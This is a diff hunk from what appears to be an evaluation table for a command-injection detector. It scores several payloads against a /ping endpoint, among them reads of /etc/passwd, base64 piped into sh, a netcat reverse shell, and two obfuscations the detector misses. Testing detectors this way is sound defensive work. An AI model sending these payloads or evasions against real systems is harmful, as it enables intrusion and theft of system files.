@@ -53,7 +53,7 @@ a human approved is what enforces.
 | command substitution | `/ping?host=$(whoami)` | caught | 0.62 | one pattern scores 0.62, under the alert-grade line |
 | backticks | `/ping?host=`id`` | caught | 0.62 | one pattern scores 0.62, under the alert-grade line |
 | ${IFS} as whitespace | `/ping?host=1;cat${IFS}/etc/passwd` | alert-grade | 0.92 |  |
-| base64 into a shell | `/ping?host=1;echo Y2F0IC9ldGMvcGFzc3dk\|base64 -d\|sh` | caught | 0.62 | caught through the `| sh` rule alone (0.62) |
+| base64 into a shell | `/ping?host=1;echo Y2F0IC9ldGMvcGFzc3dk\|base64 -d\|sh` | caught | 0.62 | caught through the `\| sh` rule alone (0.62) |
 | reverse shell | `/ping?host=1;nc 10.0.0.1 4444 -e /bin/sh` | alert-grade | 0.98 |  |
 | quote splitting | `/ping?host=1;c'a't /etc/passwd` | **missed** | 0.00 | c'a't defeats the command-name rule; /etc/passwd alone scores 0.27, under the floor |
 | wildcards instead of names | `/ping?host=1;/???/c?t /e??/p??s??` | **missed** | 0.00 | neither a known command name nor a literal sensitive path appears |
